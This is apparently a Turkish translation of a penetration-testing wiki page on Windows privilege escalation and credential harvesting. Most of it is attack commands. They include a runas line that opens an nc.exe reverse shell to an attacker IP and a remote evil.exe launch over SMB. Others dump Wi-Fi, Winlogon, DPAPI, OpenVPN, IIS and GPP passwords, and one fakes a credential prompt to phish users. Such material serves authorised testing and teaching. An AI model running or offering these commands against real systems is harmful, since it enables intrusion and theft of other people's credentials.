Windows, bir hizmet başarısız olursa alınacak eylemleri belirtmeye olanak tanır. Bu özellik, bir ikili dosyaya işaret edecek şekilde yapılandırılabilir. Eğer bu ikili dosya değiştirilebilir ise, ayrıcalık yükseltme mümkün olabilir. Daha fazla ayrıntı için [resmi belgeleri](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN) inceleyebilirsiniz.

## Applications

### Installed Applications

**ikili dosyaların izinlerini** kontrol edin (belki birini değiştirebilir ve ayrıcalıkları yükseltebilirsiniz) ve **klasörlerin** ([DLL Hijacking](dll-hijacking/)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı yapılandırma dosyalarını özel bir dosyayı okumak için değiştirebilir misiniz veya bir Yönetici hesabı (schedtasks) tarafından çalıştırılacak bir ikili dosyayı değiştirebilir misiniz kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Başlangıçta Çalıştır

**Farklı bir kullanıcı tarafından çalıştırılacak bazı kayıt defteri veya ikili dosyaları üzerine yazıp yazamayacağınızı kontrol edin.**\
**Yetki artırımı için ilginç** **autorun konumları hakkında daha fazla bilgi edinmek için** **aşağıdaki sayfayı** **okuyun**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Sürücüler

Olası **üçüncü taraf garip/zaafiyetli** sürücüleri arayın.
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Eğer **PATH üzerinde bulunan bir klasörde yazma izinleriniz varsa**, bir süreç tarafından yüklenen bir DLL'yi ele geçirip **yetkileri artırabilirsiniz**.

PATH içindeki tüm klasörlerin izinlerini kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Daha fazla bilgi için bu kontrolü nasıl kötüye kullanacağınız hakkında:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Ağ

### Paylaşımlar
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts dosyası

Hosts dosyasında hardcoded olarak bulunan diğer bilinen bilgisayarları kontrol edin.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **kısıtlı hizmetleri** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Kuralları

[**Firewall ile ilgili komutlar için bu sayfayı kontrol edin**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listele, kurallar oluştur, kapat, kapat...)**

Daha fazla[ ağ enumerasyonu için komutlar burada](../basic-cmd-for-pentesters.md#network)

### Windows Alt Sistemi için Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda bulunabilir.

Eğer root kullanıcısına erişirseniz, herhangi bir portta dinleme yapabilirsiniz (ilk kez `nc.exe` ile bir portta dinleme yaptığınızda, GUI üzerinden `nc`'nin güvenlik duvarı tarafından izin verilip verilmeyeceğini soracaktır).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Bash'i kök olarak kolayca başlatmak için `--default-user root` deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe keşfedebilirsiniz.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault, **Windows**'ın kullanıcıları otomatik olarak **giriş yapabileceği** sunucular, web siteleri ve diğer programlar için kullanıcı kimlik bilgilerini saklar. İlk bakışta, bu, kullanıcıların Facebook kimlik bilgilerini, Twitter kimlik bilgilerini, Gmail kimlik bilgilerini vb. saklayabileceği gibi görünebilir, böylece tarayıcılar aracılığıyla otomatik olarak giriş yapabilirler. Ama durum böyle değil.

Windows Vault, Windows'un kullanıcıları otomatik olarak giriş yapabileceği kimlik bilgilerini saklar, bu da demektir ki, herhangi bir **kaynağa erişmek için kimlik bilgilerine ihtiyaç duyan Windows uygulaması** **bu Credential Manager** ve Windows Vault'tan yararlanabilir ve kullanıcıların her zaman kullanıcı adı ve şifre girmesi yerine sağlanan kimlik bilgilerini kullanabilir.

Uygulamalar Credential Manager ile etkileşime geçmediği sürece, belirli bir kaynak için kimlik bilgilerini kullanmalarının mümkün olduğunu düşünmüyorum. Bu nedenle, uygulamanız vault'tan yararlanmak istiyorsa, bir şekilde **kimlik bilgilerini varsayılan depolama vault'undan talep etmek için kimlik bilgisi yöneticisi ile iletişim kurmalıdır**.

Makinedeki saklanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Sonra, kaydedilmiş kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçenekleriyle kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı aracılığıyla uzaktan bir ikili dosya çağırmaktadır.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas` komutunu sağlanan bir kimlik bilgileri seti ile kullanma.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Not edin ki mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) kullanabilirsiniz.

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelemesi için bir yöntem sağlar ve esasen Windows işletim sistemi içinde asimetrik özel anahtarların simetrik şifrelemesi için kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem sırrını kullanır.

**DPAPI, kullanıcı giriş sırlarından türetilen simetrik bir anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi içeren senaryolarda, sistemin alan kimlik doğrulama sırlarını kullanır.

DPAPI kullanarak şifrelenmiş kullanıcı RSA anahtarları, `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır; burada `{SID}`, kullanıcının [Güvenlik Tanımlayıcısı](https://en.wikipedia.org/wiki/Security_Identifier)'nı temsil eder. **DPAPI anahtarı, kullanıcının özel anahtarlarını koruyan anahtar ile aynı dosyada yer alır** ve genellikle 64 bayt rastgele veriden oluşur. (Bu dizine erişimin kısıtlandığını ve içeriğinin CMD'de `dir` komutu ile listelenemediğini, ancak PowerShell aracılığıyla listelenebileceğini not etmek önemlidir).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
**mimikatz modülünü** `dpapi::masterkey` uygun argümanlarla (`/pvk` veya `/rpc`) kullanarak şifreyi çözebilirsiniz.

**ana şifre ile korunan kimlik bilgisi dosyaları** genellikle şurada bulunur:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatz modülünü** `dpapi::cred` uygun `/masterkey` ile şifreyi çözmek için kullanabilirsiniz.\
**Bellekten birçok DPAPI** **masterkey** `sekurlsa::dpapi` modülü ile çıkarabilirsiniz (eğer root iseniz).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell Kimlik Bilgileri

**PowerShell kimlik bilgileri**, şifrelenmiş kimlik bilgilerini rahat bir şekilde saklamak için genellikle **betik yazma** ve otomasyon görevlerinde kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur, bu genellikle yalnızca oluşturuldukları bilgisayarda aynı kullanıcı tarafından şifresinin çözülebileceği anlamına gelir.

Bir dosyadan PS kimlik bilgilerini **şifrelemek için** şunu yapabilirsiniz:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Onları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` içinde bulabilirsiniz.

### Son Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgileri Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

İnsanlar genellikle Windows iş istasyonlarında **şifreleri** ve diğer bilgileri kaydetmek için StickyNotes uygulamasını kullanır, bunun bir veritabanı dosyası olduğunu fark etmeden. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aramaya ve incelemeye değerdir.

### AppCmd.exe

**AppCmd.exe'den şifreleri kurtarmak için Yönetici olmanız ve Yüksek Bütünlük seviyesinde çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya mevcutsa, bazı **kimlik bilgileri** yapılandırılmış olabilir ve **kurtarılabilir**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının var olup olmadığını kontrol edin.\
Yükleyiciler **SYSTEM ayrıcalıklarıyla çalıştırılır**, birçoğu **DLL Sideloading'e karşı savunmasızdır (Bilgi için** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Kayıt Defteri (Kimlik Bilgileri)

### Putty Kimlik Bilgileri
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Anahtarları
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH anahtarları kayıt defterinde

SSH özel anahtarları kayıt defteri anahtarı `HKCU\Software\OpenSSH\Agent\Keys` içinde saklanabilir, bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Eğer o yolda herhangi bir giriş bulursanız, muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifreli olarak saklanır ancak [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca şifresi çözülebilir.\
Bu teknik hakkında daha fazla bilgi burada: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Eğer `ssh-agent` servisi çalışmıyorsa ve otomatik olarak başlatılmasını istiyorsanız, şunu çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Bu tekniğin artık geçerli olmadığı görünüyor. Bazı ssh anahtarları oluşturmaya, bunları `ssh-add` ile eklemeye ve bir makineye ssh ile giriş yapmaya çalıştım. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri yok ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.
{% endhint %}

### Beklenmedik dosyalar
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
You can also search for these files using **metasploit**: _post/windows/gather/enum\_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Bulut Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** adında bir dosya arayın.

### Cached GPP Pasword

Daha önce, Grup Politika Tercihleri (GPP) aracılığıyla bir grup makinede özel yerel yönetici hesaplarının dağıtımına olanak tanıyan bir özellik mevcuttu. Ancak, bu yöntemin önemli güvenlik açıkları vardı. Öncelikle, SYSVOL'da XML dosyası olarak saklanan Grup Politika Nesneleri (GPO'lar), herhangi bir etki alanı kullanıcısı tarafından erişilebilir durumdaydı. İkincisi, bu GPP'lerdeki şifreler, kamuya belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenmişti ve herhangi bir kimlik doğrulaması yapılmış kullanıcı tarafından çözülebiliyordu. Bu, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine olanak tanıdığı için ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, boş olmayan bir "cpassword" alanı içeren yerel önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulunduğunda, işlev şifreyi çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP hakkında ayrıntılar ve dosyanın konumu gibi bilgileri içerir ve bu güvenlik açığının tanımlanmasına ve giderilmesine yardımcı olur.

Bu dosyalar için `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista'dan önce)_ dizininde arama yapın:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**cPassword'ı çözmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kullanarak crackmapexec şifreleri almak:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Örnek web.config ile kimlik bilgileri:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Günlükler
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Kimlik bilgilerini isteyin

Her zaman **kullanıcıdan kendi kimlik bilgilerini veya farklı bir kullanıcının kimlik bilgilerini girmesini isteyebilirsiniz** eğer onların bilip bilmeyeceğini düşünüyorsanız (dikkat edin ki **müşteriden** doğrudan **kimlik bilgilerini istemek** gerçekten **riskli**dir):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Kimlik bilgilerini içerebilecek olası dosya adları**

Bir zamanlar **düz metin** veya **Base64** formatında **şifreler** içeren bilinen dosyalar
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Tüm önerilen dosyaları ara:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Bin'i kontrol ederek içinde kimlik bilgileri olup olmadığını kontrol etmelisiniz.

Birçok program tarafından kaydedilen **şifreleri kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Inside the registry

**Kimlik bilgileri içeren diğer olası kayıt defteri anahtarları**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Açık SSH anahtarlarını kayıt defterinden çıkarın.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox**'tan şifrelerin saklandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini kontrol edin, belki bazı **şifreler** burada saklanmıştır.

Tarayıcılardan şifreleri çıkarmak için araçlar:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Üzerine Yazma**

**Bileşen Nesne Modeli (COM)**, farklı dillerdeki yazılım bileşenleri arasında **iletişim** sağlamak için Windows işletim sistemine entegre edilmiş bir teknolojidir. Her COM bileşeni, **bir sınıf kimliği (CLSID)** ile **tanımlanır** ve her bileşen, bir veya daha fazla arayüz aracılığıyla işlevsellik sunar; bu arayüzler, arayüz kimlikleri (IIDs) ile tanımlanır.

COM sınıfları ve arayüzleri, kayıt defterinde **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** ve **HKEY\_**_**CLASSES\_**_**ROOT\Interface** altında tanımlanmıştır. Bu kayıt defteri, **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT** birleştirilerek oluşturulur.

Bu kayıt defterinin CLSID'leri içinde, bir **DLL**'ye işaret eden bir **varsayılan değer** içeren **InProcServer32** adlı alt kayıt defterini bulabilirsiniz ve **ThreadingModel** adlı bir değer, **Apartment** (Tek İşlem), **Free** (Çoklu İşlem), **Both** (Tek veya Çoklu) veya **Neutral** (İşlem Nötr) olabilir.

